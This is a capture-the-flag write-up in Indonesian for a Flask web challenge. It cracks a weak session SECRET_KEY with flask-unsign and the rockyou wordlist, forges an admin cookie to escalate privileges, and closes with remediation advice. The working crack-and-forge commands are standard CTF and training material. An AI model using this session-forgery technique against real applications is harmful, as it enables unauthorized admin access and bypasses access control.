# Writeup - Sign Up and Enjoy

## Informasi Challenge
- Kategori: Web Misc
- Judul: Sign Up and Enjoy
- Target: `http://23.179.17.92:5557`

## Ringkasan Kerentanan
Aplikasi memakai Flask session cookie (signed, bukan encrypted) untuk menyimpan role user:
- `role`
- `uid`
- `username`

Endpoint `/admin` hanya cek nilai `role` dari session cookie. Karena `SECRET_KEY` aplikasi lemah (`Password1!`), cookie bisa di-`unsign`, secret bisa di-crack dengan wordlist umum, lalu cookie admin bisa dipalsukan (session forgery).

## Langkah Eksploitasi

### 1. Enumerasi endpoint
Endpoint yang terlihat:
- `/`
- `/login`
- `/register`
- `/workspace`
- `/tools/link-preview`
- `/admin`

Saat akses `/admin` sebagai user biasa, server redirect ke `/workspace`.

### 2. Buat akun / login akun valid
Setelah login, server set cookie session Flask.
Contoh isi cookie setelah decode:

```python
{'role': 'standard', 'uid': 'u_e3178437', 'username': 'u1776500504'}
```

Artinya role authorization dikontrol dari data session cookie.

### 3. Crack Flask SECRET_KEY
Bruteforce secret dilakukan dengan `flask-unsign` dan wordlist `rockyou.txt`.

Command inti:

```bash
source /home/nata/ctf_env/bin/activate
flask-unsign --unsign --cookie '<SESSION_COOKIE>' --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval -q
```

Hasil secret:

```text
Password1!
```

### 4. Forge cookie admin
Dengan secret di atas, sign payload baru yang berisi role admin:

```python
{'role':'admin','uid':'u_e3178437','username':'u1776500504'}
```

Command:

```bash
flask-unsign --sign --cookie "{'role':'admin','uid':'u_e3178437','username':'u1776500504'}" --secret 'Password1!' --no-literal-eval -q
```

Lalu akses `/admin` dengan cookie forged tersebut.

### 5. Ambil flag
Setelah role menjadi admin, halaman `/admin` terbuka dan menampilkan flag:

```text
CIT{W3ak_S3cr3t5_C@n_B3_Un5ign3d}
```

## Solver
Solver otomatis sudah disimpan di:
- `solver.py`

Jalankan:

```bash
source /home/nata/ctf_env/bin/activate
python3 solver.py --username '<USER_VALID>' --password '<PASS_VALID>'
```

Script akan:
1. Login
2. Ambil session cookie
3. Crack `SECRET_KEY`
4. Forge cookie `role=admin`
5. Akses `/admin`
6. Cetak flag

## Dampak
- Privilege escalation dari user biasa ke admin
- Bypass penuh kontrol akses endpoint sensitif

## Rekomendasi Perbaikan
- Gunakan `SECRET_KEY` kuat dan random (panjang, high entropy)
- Rotasi secret lama dan invalidasi session aktif
- Jangan simpan atribut authorization kritikal (`role`) langsung di client session cookie
- Validasi role dari sisi server/database
- Pertimbangkan server-side session storage
